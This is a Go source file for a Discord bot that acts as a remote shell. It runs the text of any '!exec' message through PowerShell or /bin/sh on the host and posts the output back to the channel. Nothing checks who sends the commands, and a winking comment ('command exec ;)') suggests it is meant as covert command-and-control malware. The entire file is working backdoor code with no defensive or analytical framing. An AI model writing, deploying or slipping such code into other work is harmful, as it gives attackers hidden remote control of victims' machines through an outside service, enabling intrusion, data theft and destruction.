package main

import (
	"fmt"     // formatted I/O
	"os/exec" // command exec ;)
	"runtime" // OS detection
	"strings" // string manipulation

	"github.com/bwmarrin/discordgo" // discord library. Run go get github.com/bwmarrin/discordgo
)

func main() {
	botToken := "APPLICATION_TOKEN"
	discord, err := discordgo.New("Bot " + botToken)
	if err != nil {
		fmt.Println("Error creating Discord session: ", err)
		return
	}
	discord.AddHandler(newMessage)
	err = discord.Open()
	if err != nil {
		fmt.Println("Error opening connection: ", err)
		return
	}
	fmt.Println("Bot is running. Press CTRL+C to exit.")
	select {} // Block forever
}

func newMessage(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore messages from the bot itself
	if m.Author.ID == s.State.User.ID {
		return
	}

	// Parse command (e.g., "!exec dir" or "!exec ls -la")
	if strings.HasPrefix(m.Content, "!exec ") {
		cmdStr := strings.TrimPrefix(m.Content, "!exec ")
		output := executeCommand(cmdStr)

		// Discord messages have a 2000 character limit
		if len(output) > 1900 {
			output = output[:1900] + "\n...(truncated)"
		}

		s.ChannelMessageSend(m.ChannelID, "```\n"+output+"\n```")
	}
}

func executeCommand(cmdStr string) string {
	if cmdStr == "" {
		return "Error: No command provided"
	}

	var cmd *exec.Cmd

	// Execute command based on OS
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell.exe", "-c", cmdStr)
	} else {
		// Linux, macOS, etc.
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	}

	// Capture both stdout and stderr
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error executing command: %v\nOutput: %s", err, string(output))
	}

	return string(output)
}
